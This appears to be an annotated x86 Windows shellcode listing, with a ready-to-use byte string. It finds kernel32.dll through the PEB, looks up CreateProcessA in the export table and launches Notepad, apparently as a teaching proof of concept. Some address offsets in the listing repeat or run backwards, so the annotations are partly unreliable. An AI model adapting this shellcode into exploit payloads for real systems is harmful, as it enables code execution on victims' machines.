
Section 1: Find base address of kernel32.dll

      0:  31 c0                   xor    eax,eax                        // EAX = 0
      2:  64 8b 58 30             mov    ebx,DWORD PTR fs:[eax+0x30]    // EBX = PEB(Process Environment Block) // using offset fs:0x30 (Segment:offset)
      6:  8b 5b 0c                mov    ebx,DWORD PTR [ebx+0xc]        // EBX = PEB_LDR_DATA // using offset 0xc
      9:  8b 5b 14                mov    ebx,DWORD PTR [ebx+0x14]       // EBX = LDR->InMemoryOrderModuleList // using offset 0x14 (First list entry)
      c:  8b 1b                   mov    ebx,DWORD PTR [ebx]            // EBX = second list entry (ntdll.dll) // in InMemoryOrderModuleList (offset 0x00)
      e:  8b 1b                   mov    ebx,DWORD PTR [ebx]            // EBX = third list entry (kernel32.dll) // in InMemoryOrderModuleList (offset 0x00)
      10: 8b 43 10                mov    eax,DWORD PTR [ebx+0x10]       // EAX = base address of kernel32.dll // using offset 0x10 from EBX

      13: 8b 78 3c                mov    edi,DWORD PTR [eax+0x3c]       // EDI = Relative Virtual Memory (RVA) of the PE signature (base address + 0x3c)
      16: 01 c7                   add    edi,eax                        // EDI = Address of PE signature = base address + RVA of PE signature
      18: 8b 57 78                mov    edx,DWORD PTR [edi+0x78]       // EDX = RVA of Export Table = Address of PE + offset 0x78
      1b: 01 c2                   add    edx,eax                        // EDX = Address of Export Table = base address + RVA of export table
      1d: 8b 7a 20                mov    edi,DWORD PTR [edx+0x20]       // EDI = RVA of Name Pointer Table = Address of Export Table + 0x20
      20: 01 c7                   add    edi,eax                        // EDI = Address of Name Pointer Table = base address + RVA of Name Pointer Table

      22: 31 db                   xor    ebx,ebx                        // EBX = 0
      24: 89 dd                   mov    ebp,ebx                        // EBP = 0

   loop:
      26: 8b 34 af                mov    esi,DWORD PTR [edi+ebp*4]      // ESI = PTR to the exported function name
      29: 01 c6                   add    esi,eax                        // ...
      2b: 45                      inc    ebp                            // Increment EBP
      2c: 81 3e 43 72 65 61       cmp    DWORD PTR [esi],0x61657243     // Name starts with "Crea"
      32: 75 f2                   jne    0x26                           // Jump to start of loop if its not equal
      34: 81 7e 08 6f 63 65 73    cmp    DWORD PTR [esi+0x8],0x7365636f // Name has "oces" at char 9 ?
      3b: 75 e9                   jne    0x26                           // Jump to start of loop if its not equal
      3d: 8b 7a 24                mov    edi,DWORD PTR [edx+0x24]       // EDI = VA of the Ordinals table
      40: 01 c7                   add    edi,eax                        // ...
      42: 66 8b 2c 6f             mov    bp,WORD PTR [edi+ebp*2]        // BP = Ordinal number of CreateProcessA
      46: 8b 7a 1c                mov    edi,DWORD PTR [edx+0x1c]       // EDI = VA of the Entry Points Table
      49: 01 c7                   add    edi,eax                        // ...
      4b: 8b 7c af fc             mov    edi,DWORD PTR [edi+ebp*4-0x4]  // EDI = VA of CreateProcessA
      4f: 01 c7                   add    edi,eax                        // ...

  Zero memory:
      51: 89 d9                   mov    ecx,ebx                        // Clear the stack
      53: b1 ff                   mov    cl,0xff                        //

      55: 53                      push   ebx                            // Push 0
      56: e2 fd                   loop   0x55                           // Push 0 to stack 255 times

  Push parameters:
      58: 68 70 61 64 61          push   0x61646170                     // adap
      5d: 66 83 6c 24 03 61       sub    WORD PTR [esp+0x3],0x61        // Remove additional character "a"
      63: 68 6e 6f 74 65          push   0x65746f6e                     // etoN
      68: 89 e2                   mov    edx,esp                        // EDX = "Notepad"
      5f: 52                      push   edx                            // Push EDX
      60: 52                      push   edx                            // Push EDX
      61: 53                      push   ebx                            // Push EBX
      62: 53                      push   ebx                            // Push EBX
      63: 53                      push   ebx                            // Push EBX
      64: 53                      push   ebx                            // Push EBX
      65: 53                      push   ebx                            // Push EBX
      66: 53                      push   ebx                            // Push EBX
      67: 52                      push   edx                            // Push EDX
      68: 53                      push   ebx                            // Push EBX
      69: ff d7                   call   edi                            // Call CreateProcessA

String :
"\x31\xc0\x64\x8b\x58\x30\x8b\x5b\x0c\x8b\x5b\x14\x8b\x1b\x8b\x1b\x8B\x43\x10\x8B\x78\x3C\x01\xC7\x8b"
  "\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xdb\x89\xdd\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x43\x72\x65\x61"
  "\x75\xf2\x81\x7e\x08\x6f\x63\x65\x73\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"
  "\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9\xb1\xff\x53\xe2\xfd\x68\x70\x61\x64\x61\x66\x83\x6C\x24\x03\x61\x68\x6E\x6F\x74\x65\x89\xe2\x52\x52\x53\x53\x53\x53\x53\x53\x52\x53\xff\xd7"
